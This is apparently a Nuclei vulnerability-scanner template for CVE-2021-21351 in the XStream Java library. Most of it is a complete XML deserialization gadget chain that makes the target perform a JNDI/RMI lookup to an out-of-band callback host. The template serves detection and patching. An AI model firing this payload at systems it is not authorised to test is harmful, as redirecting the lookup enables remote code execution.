id: CVE-2021-21351
info:
  name: XStream - Arbitrary Code Execution
  author: pwnhxl
  severity: critical
  description: A vulnerability in XStream Java library prior to version 1.4.16 enables
    remote attackers to execute arbitrary code by manipulating the processed input
    stream.
  reference:
  - https://github.com/vulhub/vulhub/tree/master/xstream/CVE-2021-21351
  - https://x-stream.github.io/CVE-2021-21351.html
  - https://paper.seebug.org/1543/
  - http://x-stream.github.io/changes.html#1.4.16
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.1
    cve-id: CVE-2021-21351
    cwe-id: CWE-502,CWE-434
  tags: cve,cve2021,xstream,deserialization,rce,oast,vulhub
  metadata:
    impact: The impact of CVE-2021-21351 in XStream is the potential for remote attackers
      to execute arbitrary code by manipulating the processed input stream.
    recommendation: We recommend updating to XStream version 1.4.16 or higher to avoid
      potential remote code execution through CVE-2021-21351.
requests:
- raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<sorted-set>\n\
    \  <javax.naming.ldap.Rdn_-RdnEntry>\n    <type>ysomap</type>\n    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>\n\
    \      <m__DTMXRTreeFrag>\n        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>\n\
    \          <m__size>-10086</m__size>\n          <m__mgrDefault>\n            <__overrideDefaultParser>false</__overrideDefaultParser>\n\
    \            <m__incremental>false</m__incremental>\n            <m__source__location>false</m__source__location>\n\
    \            <m__dtms>\n              <null/>\n            </m__dtms>\n      \
    \      <m__defaultHandler/>\n          </m__mgrDefault>\n          <m__shouldStripWS>false</m__shouldStripWS>\n\
    \          <m__indexing>false</m__indexing>\n          <m__incrementalSAXSource\
    \ class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>\n\
    \            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>\n\
    \              <javax.sql.rowset.BaseRowSet>\n                <default>\n    \
    \              <concurrency>1008</concurrency>\n                  <escapeProcessing>true</escapeProcessing>\n\
    \                  <fetchDir>1000</fetchDir>\n                  <fetchSize>0</fetchSize>\n\
    \                  <isolation>2</isolation>\n                  <maxFieldSize>0</maxFieldSize>\n\
    \                  <maxRows>0</maxRows>\n                  <queryTimeout>0</queryTimeout>\n\
    \                  <readOnly>true</readOnly>\n                  <rowSetType>1004</rowSetType>\n\
    \                  <showDeleted>false</showDeleted>\n                  <dataSource>rmi://{{interactsh-url}}/test</dataSource>\n\
    \                  <listeners/>\n                  <params/>\n               \
    \ </default>\n              </javax.sql.rowset.BaseRowSet>\n              <com.sun.rowset.JdbcRowSetImpl>\n\
    \                <default/>\n              </com.sun.rowset.JdbcRowSetImpl>\n\
    \            </fPullParserConfig>\n            <fConfigSetInput>\n           \
    \   <class>com.sun.rowset.JdbcRowSetImpl</class>\n              <name>setAutoCommit</name>\n\
    \              <parameter-types>\n                <class>boolean</class>\n   \
    \           </parameter-types>\n            </fConfigSetInput>\n            <fConfigParse\
    \ reference='../fConfigSetInput'/>\n            <fParseInProgress>false</fParseInProgress>\n\
    \          </m__incrementalSAXSource>\n          <m__walker>\n            <nextIsRaw>false</nextIsRaw>\n\
    \          </m__walker>\n          <m__endDocumentOccured>false</m__endDocumentOccured>\n\
    \          <m__idAttributes/>\n          <m__textPendingStart>-1</m__textPendingStart>\n\
    \          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>\n\
    \          <m__pastFirstElement>false</m__pastFirstElement>\n        </m__dtm>\n\
    \        <m__dtmIdentity>1</m__dtmIdentity>\n      </m__DTMXRTreeFrag>\n     \
    \ <m__dtmRoot>1</m__dtmRoot>\n      <m__allowRelease>false</m__allowRelease>\n\
    \    </value>\n  </javax.naming.ldap.Rdn_-RdnEntry>\n  <javax.naming.ldap.Rdn_-RdnEntry>\n\
    \    <type>ysomap</type>\n    <value class='com.sun.org.apache.xpath.internal.objects.XString'>\n\
    \      <m__obj class='string'>test</m__obj>\n    </value>\n  </javax.naming.ldap.Rdn_-RdnEntry>\n\
    </sorted-set>\n"
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: word
    part: body
    words:
    - timestamp
  - type: word
    part: header
    words:
    - application/json
  - type: status
    status:
    - 500
